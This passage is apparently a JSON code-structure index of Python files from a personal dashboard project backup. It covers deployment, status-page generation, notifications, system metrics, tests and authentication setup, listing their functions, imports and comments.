        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/deploy.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def _load_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig = {\n'production': {\n'host': os.getenv('DEPLOY_HOST', 'localhost'),\n'port': int(os.getenv('DEPLOY_PORT', 8000)),\n'api_key': os.getenv('DEPLOY_KEY'),\n'backup_retention_days': 7\n},\n'staging': {",
          "def create_backup(self, env: str) -> str:\n\"\"\"Create backup of current deployment.\"\"\"\nlogger.info(f\"Creating backup for {env} environment\")\n\ntimestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\nbackup_path = self.backup_dir / f\"backup_{env}_{timestamp}.tar.gz\"\n\ntry:\n# Create backup archive\nsubprocess.run([",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _get_backup_manifest(self) -> Dict[str, Any]:\n\"\"\"Create manifest of backed up files.\"\"\"\nmanifest = {'files': [], 'total_size': 0}\n\nfor path in ['src', 'static', 'templates']:\ndir_path = self.base_path / path\nif dir_path.exists():\nfor file in dir_path.rglob('*'):\nif file.is_file():\nrel_path = file.relative_to(self.base_path)",
          "def deploy(self, env: str):\n\"\"\"Deploy the dashboard to specified environment.\"\"\"\nlogger.info(f\"Starting deployment to {env}\")\n\ntry:\n# Create backup first\nbackup_path = self.create_backup(env)\n\n# Deploy steps\nself._copy_files(env)",
          "def _copy_files(self, env: str):\n\"\"\"Copy files to deployment location.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\n# Use rsync for remote deployment\nsubprocess.run([\n'rsync',\n'-av',\n'--delete',",
          "def _update_config(self, env: str):\n\"\"\"Update configuration for environment.\"\"\"\nconfig = self.config[env]\n\nconfig_file = self.base_path / f\"config_{env}.json\"\nif config_file.exists():\nif env == 'production':\nsubprocess.run([\n'scp',\nstr(config_file),",
          "def _run_migrations(self, env: str):\n\"\"\"Run any necessary migrations.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'cd /opt/dashboard && python3 src/db/migrate.py'\n], check=True)",
          "def _restart_services(self, env: str):\n\"\"\"Restart application services.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'sudo systemctl restart dashboard'\n], check=True)",
          "def _record_deployment(self, env: str, backup_path: str):\n\"\"\"Record deployment details.\"\"\"\nrecord = {\n'timestamp': datetime.now().isoformat(),\n'environment': env,\n'git_commit': self._get_git_commit(),\n'backup_path': backup_path,\n'deployer': os.getenv('USER', 'unknown')\n}\n",
          "def verify(self, env: str) -> bool:\n\"\"\"Verify deployment health.\"\"\"\nconfig = self.config[env]\n\ntry:\n# Check service status\nif env == 'production':\nresult = subprocess.run([\n'ssh',\nconfig['host'],",
          "def rollback(self, env: str):\n\"\"\"Roll back to previous deployment.\"\"\"\nlogger.info(f\"Rolling back {env} deployment\")\n\ntry:\n# Find latest backup\nbackups = sorted(\nself.backup_dir.glob(f\"backup_{env}_*.tar.gz\"),\nkey=lambda x: x.stat().st_mtime,\nreverse=True",
          "def cleanup_old_backups(self, env: str):\n\"\"\"Clean up old backup files.\"\"\"\nconfig = self.config[env]\nretention_days = config['backup_retention_days']\ncutoff_time = time.time() - (retention_days * 86400)\n\nfor backup in self.backup_dir.glob(f\"backup_{env}_*.tar.gz\"):\nif backup.stat().st_mtime < cutoff_time:\nlogger.info(f\"Removing old backup: {backup}\")\nbackup.unlink()",
          "def main():\n\"\"\"Run deployment operations based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Dashboard deployment tool')\nparser.add_argument(\n'--env',\nchoices=['production', 'staging'],\ndefault='staging',\nhelp='Deployment environment'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class Deployer:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "import json",
          "import time",
          "from pathlib import Path",
          "from datetime import datetime",
          "import requests",
          "from typing import Dict, Any, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Load environment config",
          "# Create backup archive",
          "# Record backup metadata",
          "# Create backup first",
          "# Deploy steps",
          "# Record deployment",
          "# Use rsync for remote deployment",
          "# Local deployment",
          "# Check service status",
          "# Check API health",
          "# Find latest backup",
          "# Extract backup",
          "# Restart services",
          "# Verify rollback",
          "# Remove metadata file if it exists"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/dev_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup_logging(self):"
        ],
        "class_defs": [
          "class DevelopmentController:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "import subprocess",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Check cycle time",
          "# Start new cycle",
          "# Run parallel development tracks",
          "# Monitor and adjust",
          "# Save current state",
          "# Reset active tasks",
          "# Plan next cycle",
          "# Check task completion",
          "# Adjust resources based on progress",
          "# Monitor system resources",
          "# Adjust thread allocation",
          "# Balance workload",
          "# Analyze previous cycle",
          "# Adjust priorities",
          "# Update phase targets"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/flask_test.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Configure logging"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/generate_status.py",
        "docstrings": [],
        "function_defs": [
          "def get_system_status() -> Dict:\n\"\"\"Get comprehensive system status including metrics and state.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nstatus = 'healthy'\nissues = []\nif metrics['cpu'].get('percent', 0) > 80:\nissues.append(f\"High CPU usage: {metrics['cpu']['percent']}%\")\nstatus = 'warning'\nif metrics['memory'].get('virtual', {}).get('percent', 0) > 80:",
          "def get_memorycore_stats():\n\"\"\"Get MemoryCore specific statistics.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore')\nstats = {'total_files': 0, 'total_size': 0, 'categories': {}, 'recent_changes': []}\nfor category in ['docs', 'scripts', 'data', 'models']:\ncat_path = base_path / category\nif cat_path.exists():\nfiles = list(cat_path.rglob('*'))\nfile_count = len([f for f in files if f.is_file()])\ntotal_size = sum((f.stat().st_size for f in files if f.is_file()))",
          "def get_recent_events():\n\"\"\"Get most recent events from timeline data and other sources.\"\"\"\nevents = []\nenriched_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_enriched.json')\nraw_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_data.json')\ntimeline_path = enriched_path if enriched_path.exists() else raw_path\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\ndata = json.load(f)",
          "def get_project_narrative():\n\"\"\"Get project narrative data.\"\"\"\nnarrative_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/narrative/project_narrative.json')\nif narrative_path.exists():\ntry:\nwith open(narrative_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading narrative: {e}')\nreturn None",
          "def get_system_timeline():\n\"\"\"Get system evolution timeline.\"\"\"\ntimeline_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/system_timeline.json')\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading timeline: {e}')\nreturn None",
          "def format_timeline_entry(event):\n\"\"\"Format a timeline entry for display.\"\"\"\ndate = datetime.fromisoformat(event['date'].replace('Z', '+00:00'))\nformatted_date = date.strftime('%Y-%m-%d %H:%M:%S')\ndetails = event.get('details', {})\ndetails_html = ''\nfor key, value in details.items():\nif value and str(value).strip():\ndetails_html += f\"<div class='detail'><span class='key'>{key}:</span> {value}</div>\"\nreturn f\"\\n    <div class='timeline-entry {event['type']}'>\\n        <div class='timeline-date'>{formatted_date}</div>\\n        <div class='timeline-type'>{event['type']}</div>\\n        <div class='timeline-component'>{event['component']}</div>\\n        <div class='timeline-details'>{details_html}</div>\\n    </div>\\n    \"",
          "def format_project_phase(phase):\n\"\"\"Format a project phase for display.\"\"\"\nreturn f\"\\n    <div class='phase-entry'>\\n        <div class='phase-description'>{phase['description']}</div>\\n        <div class='phase-context'>{phase['context']}</div>\\n        <div class='phase-source'>Source: {phase['source_file']}</div>\\n    </div>\\n    \"\n\ndef format_project_status(status):\n\"\"\"Format project status for display.\"\"\"",
          "def format_project_status(status):\n\"\"\"Format project status for display.\"\"\"\nhtml = \"<div class='project-status'>\"\nif 'containers' in status:\nhtml += '<h4>Containers:</h4><ul>'\nfor container, state in status['containers'].items():\nhtml += f\"<li>{container}: <span class='status-{state}'>{state}</span></li>\"\nhtml += '</ul>'\nif 'services' in status:\nhtml += '<h4>Services:</h4><ul>'",
          "def generate_network_section(network_metrics: Dict) -> str:\n\"\"\"Generate HTML for network metrics section with error handling.\"\"\"\ntry:\nhtml_parts = []\nif 'connections' in network_metrics:\nconnections = network_metrics['connections']\nhtml_parts.append(f\"<div>Total Connections: {connections.get('total', 0)}</div>\")\nif 'by_status' in connections:\nstates = [f'{state}: {count}' for state, count in connections['by_status'].items()]\nif states:",
          "def format_project_roadmap(roadmap):\n\"\"\"Format project roadmap for display.\"\"\"\nhtml = \"<div class='project-roadmap'>\"\nfor item in roadmap:\nif item['type'] == 'goals':\nhtml += '<h4>Pending Goals:</h4><ul>'\nfor goal in item['items']:\nhtml += f\"<li class='priority-{item['priority']}'>{goal}</li>\"\nhtml += '</ul>'\nelif item['type'] == 'next_phase':",
          "def generate_timeline_section(timeline_data: Optional[Dict]) -> str:\n\"\"\"Generate the timeline section HTML.\"\"\"\nif not timeline_data:\nreturn ''\nhtml = \"<div class='timeline'>\"\nhtml += \"\\n        <nav class='timeline-nav'>\\n            <div class='timeline-filters'>\\n                <button class='timeline-filter active' data-filter='all'>All</button>\\n                <button class='timeline-filter' data-filter='infrastructure'>Infrastructure</button>\\n                <button class='timeline-filter' data-filter='development'>Development</button>\\n                <button class='timeline-filter' data-filter='integration'>Integration</button>\\n                <button class='timeline-filter' data-filter='automation'>Automation</button>\\n            </div>\\n        </nav>\\n    \"\nif 'summary' in timeline_data and 'statistics' in timeline_data['summary']:\nstats = timeline_data['summary']['statistics']\nhtml += \"\\n            <div class='timeline-stats'>\\n                <h3>Timeline Statistics</h3>\\n                <div class='stats-grid'>\\n        \"\nfor category, count in stats.get('by_category', {}).items():",
          "def generate_html():\n\"\"\"Generate a simple HTML status page with error handling.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nevents = get_recent_events()\ntimeline_data = get_system_timeline()\nnarrative_data = get_project_narrative()\nprocessed_timeline = None\nif timeline_data:\ntry:",
          "def generate_error_page(error_message: str) -> str:\n\"\"\"Generate a simple error page.\"\"\"\nreturn f'\\n    <html>\\n    <head>\\n        <title>MemoryCore Status - Error</title>\\n        <style>\\n            body {{ font-family: -apple-system, system-ui, sans-serif; margin: 20px; }}\\n            .error {{ color: #f44336; padding: 20px; background: #ffebee; border-radius: 4px; }}\\n        </style>\\n    </head>\\n    <body>\\n        <h1>MemoryCore Status</h1>\\n        <div class=\"error\">\\n            <h2>Error Generating Status Page</h2>\\n            <p>{error_message}</p>\\n        </div>\\n        <script>\\n            setTimeout(() => window.location.reload(), 30000);\\n        </script>\\n    </body>\\n    </html>\\n    '\n\ndef generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\nhtml = ''\ntry:\ntimeline_css = ''\ntry:\ncss_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/src/templates/timeline.css')\nif css_path.exists():\ntimeline_css = css_path.read_text()\nexcept Exception as e:",
          "def main():\n\"\"\"Generate status page and save it.\"\"\"\ntry:\nhtml = generate_html()\noutput_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/index.html')\noutput_path.parent.mkdir(parents=True, exist_ok=True)\nwith open(output_path, 'w') as f:\nf.write(html)\nlogger.info(f'Status page generated successfully at {output_path}')\nexcept Exception as e:"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics",
          "import sys",
          "from pathlib import Path",
          "from src.processors.timeline_processor import TimelineProcessor"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 34,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/generate_status_improved.py",
        "docstrings": [],
        "function_defs": [
          "def format_html_doc(content: str) -> str:\n\"\"\"Wrap content in a complete HTML document structure.\"\"\"\nreturn f\"\"\"<!DOCTYPE html>",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\ntry:\n# Build HTML content piece by piece\nparts = []\n\n# Add header\nparts.append(\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics"
        ],
        "comments": [
          "# Initialize components",
          "# Build HTML content piece by piece",
          "# Add header",
          "# Add CSS",
          "# System metrics section",
          "# Network section",
          "# Process section",
          "# Events section",
          "# Projects and timeline section",
          "# Timeline section",
          "# Combine all parts and wrap in HTML structure"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/http_test.py",
        "docstrings": [],
        "function_defs": [
          "def _send_response(self, message, status=200):",
          "def do_GET(self):",
          "def run():"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler",
          "import json"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/logging_config.py",
        "docstrings": [],
        "function_defs": [
          "def setup_logging():\n\"\"\"Configure logging with rotation and structured format.\"\"\"\n# Create log directory if it doesn't exist\nLOG_DIR.mkdir(parents=True, exist_ok=True)\n\n# Create rotating file handler for debugging\nfile_handler = RotatingFileHandler(\nLOG_FILE,\nmaxBytes=MAX_BYTES,\nbackupCount=BACKUP_COUNT",
          "def log_with_context(logger, level, message, **context):\n\"\"\"\nLog a message with additional context.\n\nArgs:\nlogger: Logger instance\nlevel: Logging level (e.g., INFO, ERROR)\nmessage: Log message\n**context: Additional context as key-value pairs\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import logging",
          "from logging.handlers import RotatingFileHandler",
          "from pathlib import Path"
        ],
        "comments": [
          "# Constants",
          "# Create log directory if it doesn't exist",
          "# Create rotating file handler for debugging",
          "# Create console handler for warnings and errors",
          "# Reset root logger",
          "# Configure root logger",
          "# Create logger for this application",
          "# Add handlers directly to dashboard logger",
          "# Helper function for structured logging",
          "# For errors about common conditions (like access denied), downgrade to warning",
          "# Format context in a cleaner way"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/metrics_cache.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ttl_seconds: int = 60):",
          "def get(self, key: str) -> Optional[Any]:\n\"\"\"\nGet a value from cache if it exists and hasn't expired.\n\nArgs:\nkey: Cache key\n\nReturns:\nCached value if valid, None otherwise\n\"\"\"",
          "def set(self, key: str, value: Any) -> None:\n\"\"\"\nSet a value in cache with current timestamp.\n\nArgs:\nkey: Cache key\nvalue: Value to cache\n\"\"\"",
          "def invalidate(self, key: str) -> None:\n\"\"\"\nRemove a key from cache.\n\nArgs:\nkey: Cache key to remove\n\"\"\"",
          "def clear(self) -> None:\n\"\"\"Clear all cached values.\"\"\"\nself.cache.clear()\n\n# Global cache instance\nmetrics_cache = MetricsCache()\n\ndef cached(ttl_seconds: int = 60):\n\"\"\"",
          "def cached(ttl_seconds: int = 60):\n\"\"\"\nDecorator for caching function results.\n\nArgs:\nttl_seconds: Time to live in seconds for cached values\n\nReturns:\nDecorator function\n\"\"\"",
          "def decorator(func):",
          "def wrapper(*args, **kwargs):"
        ],
        "class_defs": [
          "class MetricsCache:"
        ],
        "imports": [
          "import time",
          "from typing import Dict, Any, Optional",
          "from functools import wraps",
          "from datetime import datetime, timedelta"
        ],
        "comments": [
          "# Global cache instance",
          "# Create cache key from function name and arguments",
          "# Check cache first",
          "# If not in cache, compute value"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@wraps(func)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/minimal.py",
        "docstrings": [],
        "function_defs": [
          "def index():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/minimal_http.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/notify.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _send_request(self, payload: Dict[str, Any]) -> requests.Response:\n\"\"\"Send request to Pushover API with retry logic\"\"\"\nfor attempt in range(self.retry_attempts):\ntry:\nresponse = requests.post(self.PUSHOVER_API_URL, data=payload)\nresponse.raise_for_status()\nreturn response\nexcept requests.RequestException as e:\nlogger.warning(f'Attempt {attempt + 1} failed: {str(e)}')\nif attempt < self.retry_attempts - 1:",
          "def speak_message(self, message: str, voice: str='Daniel') -> None:\n\"\"\"\nSpeak the message using macOS text-to-speech\n\nArgs:\nmessage: The message to speak\nvoice: The voice to use (default: Daniel)\n\"\"\"",
          "def send_notification(self, message: str, title: Optional[str]=None, priority: str='normal', speak: bool=True, voice: str='Daniel') -> bool:\n\"\"\"\nSend a notification via Pushover\n\nArgs:\nmessage: The message to send\ntitle: Optional title for the notification\npriority: Priority level (lowest, low, normal, high, emergency)\n\nReturns:",
          "def main():"
        ],
        "class_defs": [
          "class PushoverNotifier:"
        ],
        "imports": [
          "import os",
          "import time",
          "import logging",
          "import requests",
          "import argparse",
          "import subprocess",
          "from dotenv import load_dotenv",
          "from typing import Optional, Dict, Any"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/run_dashboard.py",
        "docstrings": [],
        "function_defs": [
          "def signal_handler(signum, frame):\n\"\"\"Handle signals gracefully.\"\"\"\nlocal_logger = logging.getLogger('Launcher')\nif flask_process:\nlocal_logger.info(\"Stopping dashboard...\")\nflask_process.terminate()\ntry:\nflask_process.wait(timeout=5)\nexcept subprocess.TimeoutExpired:\nflask_process.kill()",
          "def setup_logging():\n\"\"\"Set up logging.\"\"\"\nlog_dir = Path(__file__).parent / 'logs'\nlog_dir.mkdir(exist_ok=True, parents=True)\n\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\nhandlers=[\nlogging.FileHandler(log_dir / 'dashboard.log'),",
          "def check_dependencies():\n\"\"\"Check and install required Python packages.\"\"\"\nrequired_packages = [\n'flask',\n'werkzeug',\n'aiohttp',\n'psutil'\n]\n\nfor package in required_packages:",
          "def main():\n\"\"\"Run the dashboard.\"\"\"\nsetup_logging()\nlogger = logging.getLogger('Launcher')\n\ntry:\n# Check dependencies\ncheck_dependencies()\n\n# Set up environment"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import logging",
          "import subprocess",
          "import signal",
          "from pathlib import Path"
        ],
        "comments": [
          "# Global for the Flask process",
          "# Check dependencies",
          "# Set up environment",
          "# Start Flask application",
          "# Set up signal handlers",
          "# Start Flask process",
          "# Wait for process"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/run_tests.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def run_tests(self, test_type: Optional[str] = None, parallel: bool = True) -> bool:\n\"\"\"Run tests and generate reports.\"\"\"\nlogger.info(\"Starting test execution...\")\nstart_time = datetime.now()\n\ntry:\n# Build pytest command\ncmd = [\n'pytest',\n'--cache-clear',",
          "def _save_test_results(self, success: bool, duration: timedelta):\n\"\"\"Save test results to file.\"\"\"\nresults = {\n'timestamp': datetime.now().isoformat(),\n'success': success,\n'duration_seconds': duration.total_seconds(),\n'git_commit': self._get_git_commit()\n}\n\nresults_file = self.report_dir / 'test_results.json'",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _notify_test_completion(self, success: bool, duration: timedelta):\n\"\"\"Notify about test completion.\"\"\"\nstatus = \"PASSED\" if success else \"FAILED\"\nduration_str = str(duration).split('.')[0]  # Remove microseconds\n\nlogger.info(f\"Tests {status} in {duration_str}\")\n\n# Open reports in browser if available\nif self.report_dir.exists():\nreport_path = self.report_dir / 'report.html'",
          "def clean_reports(self):\n\"\"\"Clean old report files.\"\"\"\nif self.report_dir.exists():\nfor item in self.report_dir.iterdir():\nif item.is_file():\nitem.unlink()\n\nif self.coverage_dir.exists():\nfor item in self.coverage_dir.iterdir():\nif item.is_file():",
          "def main():\n\"\"\"Run tests based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Run dashboard tests')\nparser.add_argument(\n'--type',\nchoices=['all', 'smoke', 'integration'],\ndefault='all',\nhelp='Type of tests to run'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class TestRunner:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "from datetime import datetime",
          "from pathlib import Path",
          "import json",
          "import webbrowser",
          "from typing import List, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Build pytest command",
          "# Add coverage options",
          "# Add HTML report",
          "# Add test selection if specified",
          "# Add parallel execution if enabled",
          "# Run tests",
          "# Process results",
          "# Open reports in browser if available"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/setup_auth.py",
        "docstrings": [],
        "function_defs": [
          "def generate_salt() -> str:\n\"\"\"Generate a random salt.\"\"\"\nreturn base64.b64encode(secrets.token_bytes(16)).decode('utf-8')\n\ndef hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"",
          "def hash_password(password: str, salt: str) -> str:\n\"\"\"Hash password with salt using SHA-256.\"\"\"\ncombined = password.encode() + base64.b64decode(salt)\nreturn base64.b64encode(hashlib.sha256(combined).digest()).decode('utf-8')\n\ndef main():\n\"\"\"Set up dashboard authentication.\"\"\"",
          "def main():\n\"\"\"Set up dashboard authentication.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard')\nconfig_path = base_path / 'config/auth.json'\n\nif not config_path.parent.exists():\nconfig_path.parent.mkdir(parents=True)\n\n# Get credentials\nprint(\"Setting up dashboard authentication\")"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import getpass",
          "import hashlib",
          "import base64",
          "import secrets",
          "from pathlib import Path"
        ],
        "comments": [
          "# Get credentials",
          "# Generate salt and hash",
          "# Create or update config"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/simple_server.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class SimpleHandler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/socket_test.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import socket",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/system_metrics.py",
        "docstrings": [],
        "function_defs": [
          "def get_cpu_metrics(self) -> Dict:\n\"\"\"Get detailed CPU metrics.\"\"\"\ntry:\ncpu_freq = psutil.cpu_freq()\nreturn {\n'percent': psutil.cpu_percent(interval=1),\n'per_cpu': psutil.cpu_percent(interval=1, percpu=True),\n'count': psutil.cpu_count(),\n'count_logical': psutil.cpu_count(logical=True),\n'freq': {",
          "def get_memory_metrics(self) -> Dict:\n\"\"\"Get detailed memory metrics.\"\"\"\ntry:\nvm = psutil.virtual_memory()\nsm = psutil.swap_memory()\nreturn {\n'virtual': {\n'total_gb': round(vm.total / (1024**3), 2),\n'available_gb': round(vm.available / (1024**3), 2),\n'used_gb': round(vm.used / (1024**3), 2),",
          "def get_disk_metrics(self) -> Dict:\n\"\"\"Get detailed disk metrics.\"\"\"\ntry:\npath = '/Volumes/Mac Mini External'\nusage = psutil.disk_usage(path)\nio_counters = psutil.disk_io_counters()\n\nreturn {\n'usage': {\n'total_gb': round(usage.total / (1024**3), 2),",
          "def get_network_metrics(self) -> Dict:\n\"\"\"Get detailed network metrics with improved error handling.\"\"\"\nmetrics = {'interfaces': {}, 'connections': {'total': 0, 'by_status': {}}}\n\n# Get interface metrics first\ntry:\nio_counters = psutil.net_io_counters(pernic=True)\nfor nic, stats in io_counters.items():\n# Skip loopback and inactive interfaces\nif nic in ('lo', 'lo0') or not any([getattr(stats, attr, 0) for attr in ['bytes_sent', 'bytes_recv']]):",
          "def get_process_metrics(self, top_n: int = 10) -> List[Dict]:\n\"\"\"Get detailed process metrics.\"\"\"\ntry:\nprocesses = []\nfor proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'create_time']):\ntry:\npinfo = proc.info\n# Get additional details\nwith proc.oneshot():\npinfo['memory_gb'] = round(proc.memory_info().rss / (1024**3), 3)",
          "def get_all_metrics(self) -> Dict:\n\"\"\"Get all system metrics.\"\"\"\nreturn {\n'timestamp': datetime.now().isoformat(),\n'cpu': self.get_cpu_metrics(),\n'memory': self.get_memory_metrics(),\n'disk': self.get_disk_metrics(),\n'network': self.get_network_metrics(),\n'processes': self.get_process_metrics()\n}"
        ],
        "class_defs": [
          "class SystemMetrics:"
        ],
        "imports": [
          "import os",
          "import psutil",
          "import logging",
          "from typing import Dict, List, Optional",
          "from datetime import datetime",
          "from pathlib import Path",
          "from metrics_cache import cached",
          "from logging_config import log_with_context"
        ],
        "comments": [
          "# Get interface metrics first",
          "# Skip loopback and inactive interfaces",
          "# Log only if debug is enabled",
          "# Only log interface errors at WARNING level",
          "# Get connection metrics",
          "# Handle access denied quietly - normal for non-root users",
          "# Only log unexpected connection errors at WARNING level",
          "# Get additional details",
